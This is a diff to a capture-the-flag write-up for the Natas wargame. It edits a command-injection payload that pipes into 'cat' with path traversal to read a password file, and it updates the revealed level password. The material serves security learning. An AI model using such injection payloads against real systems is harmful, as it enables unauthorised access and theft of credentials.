@@ -14,7 +14,7 @@ revealed that there's a filed called `.htpasswd`, which I then modified it to `c
 So after struggling for way too long, someone gave me a hint. "Look at the front page of Natas." Which tells me that the password is stored in a specific location, which then makes this incredibly easy.
 
 ```sh
-| cat ../../../../etc/natas_webpass/natas9 #
+| cat ../../../../etc/natas_webpass/natas10 #
 ```
 
-> W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+> nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
